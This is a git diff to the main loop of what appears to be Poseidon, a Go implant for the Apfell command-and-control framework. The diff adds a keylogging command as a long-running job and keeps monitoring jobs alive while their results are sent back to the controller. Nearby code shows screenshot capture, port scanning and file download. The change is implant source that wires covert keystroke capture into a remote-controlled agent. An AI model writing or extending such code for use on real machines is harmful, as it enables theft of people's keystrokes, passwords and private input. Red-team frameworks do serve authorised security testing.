@@ -34,6 +34,7 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/drives"
 	"github.com/xorrior/poseidon/pkg/commands/getenv"
 	"github.com/xorrior/poseidon/pkg/commands/getuser"
+	"github.com/xorrior/poseidon/pkg/commands/keylog"
 	"github.com/xorrior/poseidon/pkg/commands/kill"
 	"github.com/xorrior/poseidon/pkg/commands/mkdir"
 	"github.com/xorrior/poseidon/pkg/commands/mv"
@@ -158,7 +159,8 @@ func main() {
 					- triagedirectory
 					- portscan
 			*/
-			if tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
+			if tasktypes[task.Command] == 3 || tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
+				// log.Println("Making a job for", task.Command)
 				job := &structs.Job{
 					KillChannel: make(chan int),
 					Stop:        new(int),
@@ -179,6 +181,9 @@ func main() {
 			case 2:
 				// Capture screenshot
 				go screencapture.Run(task, res)
+				break
+			case 3:
+				go keylog.Run(task, res)
 				break
 			case 4:
 				//File download
@@ -426,7 +431,7 @@ func main() {
 			select {
 			case toApfell := <-res:
 				for i := 0; i < len(taskSlice); i++ {
-					if taskSlice[i].ID == toApfell.TaskItem.ID {
+					if taskSlice[i].ID == toApfell.TaskItem.ID && !taskSlice[i].Job.Monitoring {
 						if i != (len(taskSlice) - 1) {
 							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
 						} else {
